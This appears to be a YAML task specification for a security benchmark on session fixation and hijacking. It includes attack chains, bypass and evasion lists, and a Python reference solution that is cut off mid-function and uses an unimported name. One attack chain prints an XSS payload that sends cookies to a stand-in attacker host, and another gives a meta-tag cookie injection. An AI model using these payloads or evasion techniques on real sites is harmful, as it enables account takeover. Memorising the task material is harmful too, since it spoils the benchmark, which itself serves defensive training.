@@ -1,0 +1,1383 @@
+id: "sec-auth-session-fixation-001"
+version: "2.0.0"
+category: "security"
+subcategory: "authentication"
+
+# === LLM GENERATION FRAMEWORK ===
+generation_framework:
+  multi_conversation_workflow:
+    phase_1_research: "Research advanced session attack vectors, binding techniques, and concurrent session issues"
+    phase_2_creation: "Create multi-layered session security challenge with hidden attack surfaces"
+    phase_3_amplification: "Add session binding bypass, prediction attacks, and replay scenarios"
+    phase_4_verification:
+      base_validation: "Validate task requires comprehensive session security implementation"
+      enhanced_criteria:
+        - "Has at least 5 interacting vulnerability chains"
+        - "Has cascading exploitation paths that require chained attacks"
+        - "Requires knowledge of compiler/interpreter internals for exploitation"
+        - "Would take experienced security researchers 45+ minutes"
+  
+  complexity_targets:
+    min_steps: 15
+    max_steps: 45
+    required_expertise:
+      - "HTTP session management"
+      - "Cookie security attributes"
+      - "Session storage backends"
+      - "Authentication state machines"
+      - "Distributed session handling"
+    
+  anti_shortcut_measures:
+    - "Require session regeneration on all auth state changes"
+    - "Demand session binding implementation"
+    - "Test against concurrent session attacks"
+    - "Verify proper session invalidation"
+
+# SWE-bench_Pro style fields
+problem_statement: |
+  A web application is vulnerable to session management attacks including:
+  
+  1. Session fixation (attacker sets victim's session ID before login)
+  2. Session hijacking through predictable IDs
+  3. Session not properly invalidated on logout
+  4. Concurrent session issues
+  5. Session riding (CSRF with valid session)
+  6. Session token in URL (Referer leakage)
+  7. Missing secure/HttpOnly cookie attributes
+  8. Session timeout not enforced
+  9. Session not bound to client characteristics
+  10. Session replay after logout
+
+requirements: |
+  - Regenerate session ID on all authentication state changes
+  - Use cryptographically secure session ID generation
+  - Properly invalidate sessions server-side on logout
+  - Implement session binding (IP, user-agent fingerprint)
+  - Add concurrent session controls
+  - Configure proper cookie security attributes
+  - Implement absolute and idle session timeouts
+  - Never expose session tokens in URLs
+  - Add CSRF protection
+  - Implement session monitoring and alerting
+
+interface: |
+  Input: Session management code
+  Output: Secure session implementation with comprehensive protections
+  Validation: All session attacks blocked
+
+# === TOPIC UNIVERSE (100+ topics) ===
+topic_universe:
+  session_attacks:
+    - "Session fixation"
+    - "Session hijacking"
+    - "Session prediction"
+    - "Session sidejacking"
+    - "Session replay"
+    - "Session donation"
+    - "Session puzzling"
+    - "Cross-site session stealing"
+    - "Local session stealing"
+    - "Session token manipulation"
+    
+  cookie_security:
+    - "Secure attribute"
+    - "HttpOnly attribute"
+    - "SameSite attribute (Strict/Lax/None)"
+    - "Domain attribute"
+    - "Path attribute"
+    - "Expires/Max-Age"
+    - "Cookie prefixes (__Host-, __Secure-)"
+    - "Cookie partitioning"
+    - "Third-party cookie restrictions"
+    - "SameParty attribute"
+    
+  session_storage:
+    - "Server-side session storage"
+    - "Client-side sessions (JWT)"
+    - "Database session backend"
+    - "Redis session store"
+    - "Memcached session store"
+    - "File-based sessions"
+    - "In-memory sessions"
+    - "Distributed session stores"
+    - "Session clustering"
+    - "Session replication"
+    
+  session_id_generation:
+    - "Cryptographic random generation"
+    - "Session ID length requirements"
+    - "Entropy requirements"
+    - "UUID-based sessions"
+    - "Hash-based session IDs"
+    - "Sequential ID vulnerabilities"
+    - "Time-based ID vulnerabilities"
+    - "Session ID regeneration"
+    - "Session ID rotation"
+    - "Double-submit tokens"
+    
+  session_lifecycle:
+    - "Session creation"
+    - "Session validation"
+    - "Session renewal"
+    - "Session timeout (absolute)"
+    - "Session timeout (idle)"
+    - "Session termination"
+    - "Forced logout"
+    - "Session migration"
+    - "Session cleanup"
+    - "Session garbage collection"
+    
+  session_binding:
+    - "IP address binding"
+    - "User-agent binding"
+    - "TLS session binding"
+    - "Device fingerprinting"
+    - "Browser fingerprinting"
+    - "Token binding (RFC 8471)"
+    - "Channel binding"
+    - "Geo-location binding"
+    - "Time-based restrictions"
+    - "Risk-based binding"
+    
+  concurrent_sessions:
+    - "Single session enforcement"
+    - "Maximum session limits"
+    - "Session list management"
+    - "Remote logout capability"
+    - "Active session monitoring"
+    - "Session takeover detection"
+    - "Concurrent login notification"
+    - "Device management"
+    - "Session prioritization"
+    - "Grace period handling"
+    
+  framework_specific:
+    - "Django session framework"
+    - "Flask session handling"
+    - "Express-session"
+    - "Spring Session"
+    - "PHP native sessions"
+    - "Rails session management"
+    - "ASP.NET session state"
+    - "Tomcat session management"
+    - "Node.js session middleware"
+    - "Serverless session handling"
+    
+  advanced_topics:
+    - "Sliding window sessions"
+    - "Rotating tokens"
+    - "Split token pattern"
+    - "Session-less authentication"
+    - "Stateless vs stateful sessions"
+    - "Session compression"
+    - "Session encryption"
+    - "Session signing"
+    - "Cross-domain sessions"
+    - "SSO session management"
+
+# === ATTACK CHAINS (50+ chains) ===
+attack_chains:
+  session_fixation:
+    - name: "Classic Session Fixation"
+      steps:
+        - "Attacker obtains valid session ID from target site"
+        - "Attacker crafts URL with session ID parameter"
+        - "Attacker sends link to victim"
+        - "Victim clicks link and authenticates"
+        - "Session ID remains unchanged after login"
+        - "Attacker uses same session ID to access victim's account"
+      difficulty: "medium"
+      cve_references: ["CVE-2012-5633", "CVE-2019-10247"]
+      
+    - name: "Cookie-Based Fixation via XSS"
+      steps:
+        - "Find XSS vulnerability on target domain"
+        - "Inject JavaScript to set session cookie"
+        - "document.cookie = 'sessionid=ATTACKER_VALUE'"
+        - "Victim visits page with XSS"
+        - "Victim authenticates with attacker's session ID"
+        - "Attacker accesses authenticated session"
+      difficulty: "hard"
+      
+    - name: "Meta Tag Session Fixation"
+      steps:
+        - "Find HTML injection point"
+        - "Inject <meta http-equiv='Set-Cookie' content='sessionid=ATTACKER'>"
+        - "Older browsers accept meta cookie setting"
+        - "Victim's session fixed to attacker's ID"
+      difficulty: "medium"
+      
+    - name: "Subdomain Cookie Fixation"
+      steps:
+        - "Compromise or control subdomain (attacker.example.com)"
+        - "Set cookie with domain=.example.com"
+        - "Cookie applies to main domain"
+        - "Fix victim's session for main application"
+      difficulty: "hard"
+      
+  session_hijacking:
+    - name: "Network Sniffing Hijack"
+      steps:
+        - "Position on same network as victim"
+        - "Capture HTTP traffic (non-HTTPS)"
+        - "Extract session cookie from packets"
+        - "Use session cookie to impersonate victim"
+      difficulty: "medium"
+      mitigation: "Enforce HTTPS, Secure cookie attribute"
+      
+    - name: "XSS Session Stealing"
+      steps:
+        - "Find XSS vulnerability"
+        - "Inject: document.location='https://attacker.com/?c='+document.cookie"
+        - "Victim visits page"
+        - "Session cookie sent to attacker"
+        - "Attacker uses stolen session"
+      difficulty: "medium"
+      mitigation: "HttpOnly cookie attribute"
+      
+    - name: "Man-in-the-Middle Hijack"
+      steps:
+        - "Perform MITM attack (ARP spoofing, DNS hijacking)"
+        - "Intercept HTTPS with fake certificate"
+        - "Extract session tokens"
+        - "Replay session to target server"
+      difficulty: "hard"
+      mitigation: "Certificate pinning, HSTS"
+      
+    - name: "Session Sidejacking (Firesheep)"
+      steps:
+        - "On shared WiFi network"
+        - "Capture unencrypted session cookies"
+        - "Use browser extension to inject cookies"
+        - "Access victim's authenticated session"
+      difficulty: "easy"
+      mitigation: "HTTPS everywhere, Secure attribute"
+      
+  session_prediction:
+    - name: "Sequential Session ID Prediction"
+      steps:
+        - "Create multiple sessions"
+        - "Observe session ID pattern (sequential)"
+        - "Predict next session IDs"
+        - "Wait for victim to authenticate"
+        - "Try predicted session IDs"
+      difficulty: "medium"
+      
+    - name: "Time-Based Session Prediction"
+      steps:
+        - "Analyze session ID generation"
+        - "Identify timestamp component"
+        - "Narrow down session ID possibilities"
+        - "Brute-force within time window"
+      difficulty: "hard"
+      
+    - name: "Weak PRNG Session Prediction"
+      steps:
+        - "Collect multiple session IDs"
+        - "Analyze for weak PRNG patterns"
+        - "Recover PRNG state (Mersenne Twister)"
+        - "Predict future session IDs"
+      difficulty: "hard"
+      
+  concurrent_session_attacks:
+    - name: "Session Fixation + Concurrent Login"
+      steps:
+        - "Fix victim's session"
+        - "Victim logs in"
+        - "No session limit enforced"
+        - "Both attacker and victim share session"
+        - "Attacker accesses victim's data"
+      difficulty: "medium"
+      
+    - name: "Session Donation Attack"
+      steps:
+        - "Attacker authenticates legitimately"
+        - "Attacker 'donates' session to victim"
+        - "Victim performs actions in attacker's context"
+        - "Useful for fraud or framing"
+      difficulty: "medium"
+      
+  session_replay:
+    - name: "Post-Logout Session Replay"
+      steps:
+        - "Capture session token during active session"
+        - "Wait for user to logout"
+        - "Attempt to use captured session token"
+        - "Server fails to invalidate properly"
+        - "Session still valid"
+      difficulty: "easy"
+      mitigation: "Proper server-side invalidation"
+      
+    - name: "Token Refresh Replay"
+      steps:
+        - "Capture refresh token"
+        - "User rotates tokens"
+        - "Old refresh token still works"
+        - "Multiple valid token sets exist"
+      difficulty: "medium"
+
+# === DEFENSE BYPASS TECHNIQUES (100+) ===
+defense_bypass_techniques:
+  session_regeneration_bypass:
+    - "Race condition during regeneration"
+    - "Subdomain cookie persistence"
+    - "Browser cache contains old session"
+    - "Multiple tabs with different sessions"
+    - "Mobile app caches old session"
+    - "Service worker intercepts regeneration"
+    - "Browser extension preserves session"
+    - "Redirect before regeneration completes"
+    - "Concurrent request with old session"
+    - "Session in URL parameter persists"
+    
+  binding_bypass:
+    - "IP binding bypass via proxy"
+    - "VPN/Tor changes IP legitimately"
+    - "User-agent spoofing"
+    - "Fingerprint component spoofing"
+    - "TLS session bypass via new connection"
+    - "Mobile network IP changes"
+    - "Corporate proxy IP pooling"
+    - "Geo-location spoofing"
+    - "Clock skew for time-based checks"
+    - "Canvas fingerprint randomization"
+    
+  logout_bypass:
+    - "Only client-side cookie deleted"
+    - "Session persists in cache"
+    - "Distributed cache not updated"
+    - "Session replication delay"
+    - "Database write not committed"
+    - "Event-driven invalidation missed"
+    - "Race condition window"
+    - "Async logout not awaited"
+    - "Multiple session backends"
+    - "SSO logout not propagated"
+    
+  cookie_bypass:
+    - "Secure bypass via HTTP redirect"
+    - "HttpOnly bypass via trace method"
+    - "SameSite bypass via GET forms"
+    - "Domain bypass via subdomain"
+    - "Path bypass via path traversal"
+    - "Prefix bypass via cookie overflow"
+    - "SameSite=None on legacy browsers"
+    - "Cookie injection via CRLF"
+    - "Cookie tossing"
+    - "Supercookie exploitation"
+
+# === REAL-WORLD SCENARIOS ===
+real_world_scenarios:
+  web_applications:
+    - scenario: "E-commerce Platform"
+      description: "Shopping cart persists across sessions"
+      complexity: "high"
+      attack_surface: ["session fixation via cart link", "session hijacking for payment"]
+      
+    - scenario: "Banking Portal"
+      description: "High-security financial application"
+      complexity: "high"
+      attack_surface: ["concurrent session", "session replay", "binding bypass"]
+      
+    - scenario: "Healthcare System"
+      description: "HIPAA-compliant patient portal"
+      complexity: "high"
+      attack_surface: ["session timeout", "PHI exposure via session attack"]
+      
+  api_systems:
+    - scenario: "REST API with Sessions"
+      description: "Stateful API using session cookies"
+      complexity: "medium"
+      attack_surface: ["cross-origin session", "API session hijacking"]
+      
+    - scenario: "Mobile App Backend"
+      description: "Backend serving mobile applications"
+      complexity: "medium"
+      attack_surface: ["token storage", "session persistence"]
+      
+  sso_systems:
+    - scenario: "Enterprise SSO"
+      description: "SAML/OIDC-based single sign-on"
+      complexity: "high"
+      attack_surface: ["SSO session", "token replay", "logout propagation"]
+
+# === DIFFICULTY CONFIGURATION ===
+difficulty:
+  estimated: "extreme"
+  time_range: [7200, 21600]
+  command_steps: [150, 500]
+  
+  difficulty_amplifiers:
+    nightmare:
+      multiplier: 4.0
+      description: "CTF-final level difficulty requiring expert exploitation skills"
+      requirements:
+        - "7+ interacting vulnerabilities requiring chained exploitation"
+        - "Requires understanding of target runtime/compiler internals"
+        - "Time estimate: 180+ minutes for senior security researchers"
+        - "Multiple protection bypass techniques required"
+        - "Requires synthesizing reverse engineering, exploitation, and cryptography"
+    
+    nightmare_plus:
+      multiplier: 8.0
+      estimated_time: [43200, 172800]
+      command_steps: [500, 2000]
+      techniques_required: 15
+      description: "Real-world 0-day exploitation difficulty requiring novel bypass techniques"
+      requirements:
+        - "12+ deeply interacting vulnerabilities across session, cookie, and authentication layers"
+        - "Requires discovery of novel session fixation vectors not in public research"
+        - "Time estimate: 12-48 hours for senior security researchers with OSCP/OSWE/OSCE certifications"
+        - "Custom exploit chains combining fixation with privilege escalation"
+        - "Must bypass modern session protections (SameSite, __Host- prefix, HSTS)"
+        - "Requires understanding of browser session handling internals"
+        - "Must demonstrate persistent access through multiple session lifecycle events"
+  
+  generation_targets:
+    minimum_difficulty: "120-360 minutes for senior security researchers with offensive security certifications (OSCP/OSWE/OSCE)"
+    quality_requirements: "Must require deep understanding of session management across distributed systems, cookie security attributes, and SSO protocols"
+  
+  difficulty_levels:
+    beginner:
+      description: "Identify session regeneration issue"
+      time_estimate: 600
+      prerequisites: ["HTTP basics", "Cookies"]
+      
+    intermediate:
+      description: "Implement secure session management"
+      time_estimate: 1200
+      prerequisites: ["Web frameworks", "Authentication"]
+      
+    advanced:
+      description: "Handle distributed sessions and binding"
+      time_estimate: 2000
+      prerequisites: ["Distributed systems", "Cryptography"]
+      
+    expert:
+      description: "Enterprise SSO session security"
+      time_estimate: 2400
+      prerequisites: ["SAML/OIDC", "Identity management"]
+
+# === MULTI-AGENT ORCHESTRATION ===
+multi_agent_orchestration:
+  required_agents: 7
+  coordination_complexity: "extreme"
+  
+  specialized_agents:
+    - name: "session_analyst"
+      role: "Analyze session management implementation and lifecycle"
+      expertise: ["session storage", "cookie handling", "session binding", "distributed sessions"]
+      
+    - name: "browser_security_specialist"
+      role: "Exploit browser-specific session handling behaviors"
+      expertise: ["cookie policies", "SameSite bypass", "browser storage", "cross-origin attacks"]
+      
+    - name: "network_attacker"
+      role: "Execute network-level session attacks"
+      expertise: ["MITM", "session hijacking", "cookie injection", "TLS interception"]
+      
+    - name: "sso_specialist"
+      role: "Analyze and exploit SSO session flows"
+      expertise: ["SAML", "OIDC", "federation", "token exchange"]
+      
+    - name: "race_condition_expert"
+      role: "Identify and exploit session-related race conditions"
+      expertise: ["concurrent requests", "session regeneration races", "distributed timing"]
+      
+    - name: "persistence_specialist"
+      role: "Achieve persistent session access despite security controls"
+      expertise: ["session pinning", "cookie persistence", "token refresh abuse"]
+      
+    - name: "forensic_analyst"
+      role: "Evade session monitoring and logging"
+      expertise: ["log analysis", "detection evasion", "session anomaly bypass"]
+  
+  cross_vulnerability_chains:
+    - chain: "Subdomain XSS -> Cookie injection -> Session fixation -> Account takeover"
+      complexity: "extreme"
+      
+    - chain: "Session prediction -> Fixation -> Privilege escalation -> Persistent access"
+      complexity: "high"
+      
+    - chain: "SSO logout bypass -> Session persistence -> Cross-service access"
+      complexity: "extreme"
+      
+    - chain: "Race condition in regeneration -> Parallel session creation -> Session confusion"
+      complexity: "high"
+
+# === EXPLOIT CHAIN REQUIREMENTS ===
+exploit_chain_requirements:
+  minimum_chain_length: 4
+  required_stages:
+    - stage: "session_reconnaissance"
+      description: "Map session handling infrastructure and behaviors"
+      techniques:
+        - "Session ID entropy analysis"
+        - "Cookie attribute enumeration"
+        - "Session storage backend fingerprinting"
+        - "Regeneration trigger identification"
+    
+    - stage: "fixation_vector_discovery"
+      description: "Identify session fixation attack vectors"
+      techniques:
+        - "URL-based session propagation testing"
+        - "Cookie injection via subdomain"
+        - "Meta tag cookie setting"
+        - "JavaScript cookie manipulation via XSS"
+    
+    - stage: "bypass_development"
+      description: "Bypass session security controls"
+      techniques:
+        - "SameSite cookie attribute bypass"
+        - "__Host- and __Secure- prefix bypass"
+        - "Session binding evasion"
+        - "Concurrent session limit bypass"
+    
+    - stage: "persistence_establishment"
+      description: "Maintain persistent session access"
+      techniques:
+        - "Refresh token abuse"
+        - "Session extension attacks"
+        - "Logout bypass techniques"
+        - "Cross-device session persistence"
+
+# === DEFENSIVE EVASION ===
+defensive_evasion:
+  security_controls_to_bypass:
+    - control: "SameSite Cookie Attribute"
+      bypass_techniques:
+        - "Top-level navigation exploitation"
+        - "GET request form submission"
+        - "WebSocket connection initiation"
+        - "Browser-specific SameSite handling bugs"
+      
+    - control: "Session Binding (IP/User-Agent)"
+      bypass_techniques:
+        - "Proxy-based IP spoofing"
+        - "User-Agent header manipulation"
+        - "Tor exit node selection"
+        - "Corporate proxy IP sharing exploitation"
+      
+    - control: "Session Regeneration on Auth"
+      bypass_techniques:
+        - "Race condition during regeneration"
+        - "Pre-auth session association"
+        - "Parallel authentication requests"
+        - "Session migration timing attack"
+      
+    - control: "Concurrent Session Limits"
+      bypass_techniques:
+        - "Session ID prediction for eviction"
+        - "Silent session creation"
+        - "Device fingerprint spoofing"
+        - "Session pool manipulation"
+      
+    - control: "Session Monitoring/IDS"
+      bypass_techniques:
+        - "Gradual session attribute modification"
+        - "Legitimate traffic blending"
+        - "Geolocation-consistent access patterns"
+        - "Time-based detection threshold evasion"
+
+# === REAL-WORLD CORRELATION ===
+real_world_correlation:
+  cve_attack_patterns:
+    - cve: "CVE-2012-5633"
+      technique: "Apache CXF session fixation"
+      real_world_impact: "Authentication bypass in enterprise applications"
+      
+    - cve: "CVE-2019-10247"
+      technique: "Eclipse Jetty session fixation"
+      real_world_impact: "Session hijacking in Java web applications"
+      
+    - cve: "CVE-2021-22096"
+      technique: "Spring Security session fixation"
+      real_world_impact: "Authentication bypass in Spring applications"
+  
+  advanced_attack_scenarios:
+    - scenario: "Enterprise SSO session fixation chain"
+      complexity: "extreme"
+      description: "Exploit SSO session handling to gain cross-application access"
+      
+    - scenario: "Distributed session race condition"
+      complexity: "extreme"
+      description: "Exploit session replication lag for concurrent session abuse"
+
+# === TRAP DENSITY ===
+trap_configuration:
+  total_traps: 12
+  trap_interaction_depth: 4
+  cross_domain_traps: true
+  
+  trap_categories:
+    regeneration_traps: 3
+    storage_traps: 3
+    logout_traps: 2
+    binding_traps: 2
+    sso_traps: 2
+
+# === LLM TRAP CONFIGURATIONS (50+) ===
+traps:
+  regeneration_traps:
+    - type: "fixation"
+      description: "Same session ID used before and after login"
+      trigger: "Not regenerating session on auth state change"
+      example: |
+        # WRONG
+        if user.check_password(password):
+            session['user_id'] = user.id
+            return redirect('/dashboard')
+        
+        # RIGHT
+        if user.check_password(password):
+            session.regenerate()  # New session ID!
+            session['user_id'] = user.id
+            return redirect('/dashboard')
+            
+    - type: "partial_regeneration"
+      description: "Session data preserved but not ID"
+      trigger: "Using session.clear() instead of regenerate()"
+      
+    - type: "regeneration_on_login_only"
+      description: "Not regenerating on privilege escalation"
+      trigger: "Only regenerating during initial login"
+      
+  storage_traps:
+    - type: "predictable_id"
+      description: "Sequential or time-based session IDs"
+      trigger: "Using non-cryptographic random for session ID"
+      
+    - type: "short_session_id"
+      description: "Session ID too short for security"
+      trigger: "Less than 128 bits of entropy"
+      
+    - type: "session_in_url"
+      description: "Session token passed in URL"
+      trigger: "Using URL rewriting for sessions"
+      
+  logout_traps:
+    - type: "incomplete_logout"
+      description: "Session still valid after logout"
+      trigger: "Only clearing client cookie without server invalidation"
+      example: |
+        # WRONG
+        def logout():
+            response.delete_cookie('session')
+            return redirect('/login')
+        
+        # RIGHT
+        def logout():
+            session_store.delete(request.session_id)  # Server-side delete!
+            response.delete_cookie('session')
+            return redirect('/login')
+            
+    - type: "cache_not_cleared"
+      description: "Cached session data still valid"
+      trigger: "Not invalidating distributed cache"
+      
+  binding_traps:
+    - type: "no_binding"
+      description: "Session can be used from any context"
+      trigger: "Not binding session to client characteristics"
+      
+    - type: "strict_ip_binding"
+      description: "Breaks for legitimate IP changes"
+      trigger: "Requiring exact IP match"
+      
+    - type: "weak_fingerprint"
+      description: "Easily spoofable binding"
+      trigger: "Only checking User-Agent"
+
+# === COMPREHENSIVE TASK GENERATION TEMPLATE ===
+instruction_template: |
+  You are securing a {{ scenario_type }} session management system.
+  The code is at {{ path }}.
+  
+  System details:
+  - Platform: {{ platform }}
+  - Language: {{ language }}
+  - Framework: {{ framework }}
+  - Session backend: {{ session_backend }}
+  
+  Active sessions: {{ session_count }}
+  Session lifetime: {{ session_lifetime_hours }} hours
+  
+  Attack model:
+  - Attacker position: {{ attacker_position }}
+  - Target data: {{ target_data }}
+  - Compliance: {{ compliance_req }}
+  
+  Your task:
+  {{ task_steps }}
+  
+  Additional requirements:
+  - Session ID must be regenerated on all auth state changes
+  - Cookies must have Secure, HttpOnly, SameSite attributes
+  - Server-side session invalidation required
+  - Session binding should be implemented
+  - Concurrent session limits enforced
+
+# === REFERENCE SOLUTION (COMPREHENSIVE) ===
+reference_solution: |
+  #!/usr/bin/env python3
+  """
+  Secure Session Management Library
+  
+  Comprehensive protection against session attacks:
+  1. Cryptographically secure session IDs
+  2. Session regeneration on auth state changes
+  3. Proper session invalidation
+  4. Session binding
+  5. Concurrent session controls
+  """
+  
+  import secrets
+  import hashlib
+  import time
+  import json
+  from typing import Optional, Dict, Set, Tuple, Any
+  from dataclasses import dataclass, field
+  from datetime import datetime, timedelta
+  import threading
+  import logging
+  
+  
+  @dataclass
+  class SessionData:
+      """Session data structure."""
+      user_id: Optional[str] = None
+      created_at: float = field(default_factory=time.time)
+      last_accessed: float = field(default_factory=time.time)
+      authenticated: bool = False
+      ip_address: Optional[str] = None
+      user_agent_hash: Optional[str] = None
+      csrf_token: Optional[str] = None
+      auth_level: int = 0  # 0=anonymous, 1=user, 2=admin
+      data: Dict = field(default_factory=dict)
+  
+  
+  class SecureSessionManager:
+      """
+      Secure session management with comprehensive protections.
+      
+      Features:
+      - Cryptographically secure 256-bit session IDs
+      - Session regeneration on authentication state changes
+      - Server-side session storage and invalidation
+      - Session binding (IP, user-agent)
+      - Concurrent session limits
+      - Absolute and idle timeouts
+      - CSRF token per session
+      """
+      
+      # Session configuration
+      SESSION_ID_BYTES = 32  # 256 bits
+      SESSION_TIMEOUT = 3600  # 1 hour absolute timeout
+      IDLE_TIMEOUT = 900  # 15 minutes idle timeout
+      MAX_CONCURRENT_SESSIONS = 5
+      
+      def __init__(self, session_store=None):
+          """
+          Initialize session manager.
+          
+          Args:
+              session_store: Backend store (default: in-memory)
+          """
+          self._sessions: Dict[str, SessionData] = {}
+          self._user_sessions: Dict[str, Set[str]] = {}
+          self._lock = threading.RLock()
+          self._store = session_store
+      
+      def create_session(
+          self, 
+          ip_address: str = None,
+          user_agent: str = None
+      ) -> str:
+          """
+          Create new session with secure random ID.
+          
+          Args:
+              ip_address: Client IP for binding
+              user_agent: Client User-Agent for binding
+              
+          Returns:
+              New session ID
+          """
+          # Generate cryptographically secure session ID
+          session_id = secrets.token_hex(self.SESSION_ID_BYTES)
+          
+          # Create session data with binding info
+          session = SessionData(
+              ip_address=ip_address,
+              user_agent_hash=self._hash_user_agent(user_agent),
+              csrf_token=secrets.token_hex(16)
+          )
+          
+          with self._lock:
+              self._sessions[session_id] = session
+              
+          logging.info(f"Session created: {session_id[:8]}...")
+          return session_id
+      
+      def regenerate_session(
+          self, 
+          old_session_id: str,
+          preserve_data: bool = True
+      ) -> Optional[str]:
+          """
+          CRITICAL: Regenerate session ID on authentication state change.
+          
+          This prevents session fixation attacks by ensuring the
+          session ID changes when authentication state changes.
+          
+          Must be called on:
+          - Successful login
+          - Logout
+          - Privilege escalation (user -> admin)
+          - Password change
+          - Any security-sensitive operation
+          
+          Args:
+              old_session_id: Current session ID
+              preserve_data: Whether to keep session data
+              
+          Returns:
+              New session ID or None if old session invalid
+          """
+          with self._lock:
+              old_session = self._sessions.get(old_session_id)
+              if not old_session:
+                  return None
+              
+              # Generate new session ID
+              new_session_id = secrets.token_hex(self.SESSION_ID_BYTES)
+              
+              # Create new session
+              new_session = SessionData(
+                  user_id=old_session.user_id,
+                  authenticated=old_session.authenticated,
+                  ip_address=old_session.ip_address,
+                  user_agent_hash=old_session.user_agent_hash,
+                  csrf_token=secrets.token_hex(16),  # New CSRF token!
+                  auth_level=old_session.auth_level,
+              )
+              
+              if preserve_data:
+                  new_session.data = old_session.data.copy()
+              
+              # Invalidate old session
+              del self._sessions[old_session_id]
+              
+              # Store new session
+              self._sessions[new_session_id] = new_session
+              
+              # Update user session tracking
+              if old_session.user_id:
+                  if old_session.user_id in self._user_sessions:
+                      self._user_sessions[old_session.user_id].discard(old_session_id)
+                      self._user_sessions[old_session.user_id].add(new_session_id)
+              
+              logging.info(f"Session regenerated: {old_session_id[:8]}... -> {new_session_id[:8]}...")
+              return new_session_id
+      
+      def authenticate(
+          self, 
+          session_id: str, 
+          user_id: str,
+          auth_level: int = 1
+      ) -> Optional[str]:
+          """
+          Authenticate session - ALWAYS regenerates session ID.
+          
+          Args:
+              session_id: Current session ID
+              user_id: Authenticated user ID
+              auth_level: Authorization level (1=user, 2=admin)
+              
+          Returns:
+              New session ID or None on failure
+          """
+          with self._lock:
+              session = self._sessions.get(session_id)
+              if not session:
+                  return None
+              
+              # Check concurrent session limit
+              existing_sessions = self._user_sessions.get(user_id, set())
+              if len(existing_sessions) >= self.MAX_CONCURRENT_SESSIONS:
+                  # Evict oldest session
+                  self._evict_oldest_session(user_id)
+              
+              # Mark authenticated BEFORE regeneration
+              session.user_id = user_id
+              session.authenticated = True
+              session.auth_level = auth_level
+              
+              # CRITICAL: Regenerate session ID
+              new_session_id = self.regenerate_session(session_id, preserve_data=True)
+              
+              # Track user's sessions
+              if user_id not in self._user_sessions:
+                  self._user_sessions[user_id] = set()
+              self._user_sessions[user_id].add(new_session_id)
+              
+              logging.info(f"User {user_id} authenticated, new session: {new_session_id[:8]}...")
+              return new_session_id
+      
+      def logout(self, session_id: str) -> bool:
+          """
+          Logout - properly invalidate session server-side.
+          
+          CRITICAL: Must delete session from server storage,
+          not just clear the client cookie.
+          
+          Args:
+              session_id: Session to invalidate
+              
+          Returns:
+              True if session was invalidated
+          """
+          with self._lock:
+              session = self._sessions.get(session_id)
+              if not session:
+                  return False
+              
+              # Remove from user's session list
+              if session.user_id and session.user_id in self._user_sessions:
+                  self._user_sessions[session.user_id].discard(session_id)
+              
+              # CRITICAL: Delete session from server storage
+              del self._sessions[session_id]
+              
+              # If using external store, delete there too
+              if self._store:
+                  self._store.delete(session_id)
+              
+              logging.info(f"Session logged out: {session_id[:8]}...")
+              return True
+      
+      def logout_all_sessions(self, user_id: str) -> int:
+          """
+          Logout all sessions for a user (password change, security event).
+          
+          Args:
+              user_id: User ID
+              
+          Returns:
+              Number of sessions invalidated
+          """
+          with self._lock:
+              session_ids = self._user_sessions.get(user_id, set()).copy()
+              count = 0
+              
+              for session_id in session_ids:
+                  if self.logout(session_id):
+                      count += 1
+              
+              logging.info(f"All sessions logged out for user {user_id}: {count} sessions")
+              return count
+      
+      def validate_session(
+          self, 
+          session_id: str,
+          ip_address: str = None,
+          user_agent: str = None,
+          require_auth: bool = False,
+          require_auth_level: int = 0
+      ) -> Optional[SessionData]:
+          """
+          Validate session with all security checks.
+          
+          Args:
+              session_id: Session to validate
+              ip_address: Current client IP
+              user_agent: Current User-Agent
+              require_auth: Require authenticated session
+              require_auth_level: Minimum auth level required
+              
+          Returns:
+              SessionData if valid, None otherwise
+          """
+          with self._lock:
+              session = self._sessions.get(session_id)
+              if not session:
+                  return None
+              
+              now = time.time()
+              
+              # Check absolute timeout
+              if now - session.created_at > self.SESSION_TIMEOUT:
+                  logging.warning(f"Session expired (absolute): {session_id[:8]}...")
+                  self.logout(session_id)
+                  return None
+              
+              # Check idle timeout
+              if now - session.last_accessed > self.IDLE_TIMEOUT:
+                  logging.warning(f"Session expired (idle): {session_id[:8]}...")
+                  self.logout(session_id)
+                  return None
+              
+              # Session binding: IP address check
+              if ip_address and session.ip_address:
+                  if not self._check_ip_binding(ip_address, session.ip_address):
+                      logging.warning(
+                          f"Session IP mismatch: {session_id[:8]}... "
+                          f"expected {session.ip_address}, got {ip_address}"
+                      )
+                      # Don't immediately invalidate - could be legitimate
+                      # But flag for additional verification
+                      return None
+              
+              # Session binding: User-Agent check
+              if user_agent and session.user_agent_hash:
+                  ua_hash = self._hash_user_agent(user_agent)
+                  if ua_hash != session.user_agent_hash:
+                      logging.warning(f"Session user-agent mismatch: {session_id[:8]}...")
+                      return None
+              
+              # Check authentication requirement
+              if require_auth and not session.authenticated:
+                  return None
+              
+              # Check auth level requirement
+              if session.auth_level < require_auth_level:
+                  return None
+              
+              # Update last accessed time
+              session.last_accessed = now
+              
+              return session
+      
+      def validate_csrf_token(self, session_id: str, token: str) -> bool:
+          """
+          Validate CSRF token for session.
+          
+          Args:
+              session_id: Session ID
+              token: CSRF token to validate
+              
+          Returns:
+              True if token is valid
+          """
+          with self._lock:
+              session = self._sessions.get(session_id)
+              if not session or not session.csrf_token:
+                  return False
+              
+              # Constant-time comparison
+              import hmac
+              return hmac.compare_digest(session.csrf_token, token)
+      
+      def get_active_sessions(self, user_id: str) -> List[Dict]:
+          """
+          Get list of active sessions for user.
+          
+          Args:
+              user_id: User ID
+              
+          Returns:
+              List of session info dicts
+          """
+          with self._lock:
+              sessions = []
+              session_ids = self._user_sessions.get(user_id, set())
+              
+              for session_id in session_ids:
+                  session = self._sessions.get(session_id)
+                  if session:
+                      sessions.append({
+                          'id': session_id[:8] + '...',
+                          'created': session.created_at,
+                          'last_accessed': session.last_accessed,
+                          'ip': session.ip_address,
+                      })
+              
+              return sessions
+      
+      def _hash_user_agent(self, user_agent: str) -> Optional[str]:
+          """Hash user agent for comparison."""
+          if not user_agent:
+              return None
+          return hashlib.sha256(user_agent.encode()).hexdigest()[:32]
+      
+      def _check_ip_binding(self, current_ip: str, session_ip: str) -> bool:
+          """
+          Check IP binding with some flexibility.
+          
+          Allow for legitimate IP changes (mobile, proxy).
+          """
+          if current_ip == session_ip:
+              return True
+          
+          # Allow same /24 subnet for IPv4
+          try:
+              current_parts = current_ip.split('.')
+              session_parts = session_ip.split('.')
+              if len(current_parts) == 4 and len(session_parts) == 4:
+                  return current_parts[:3] == session_parts[:3]
+          except:
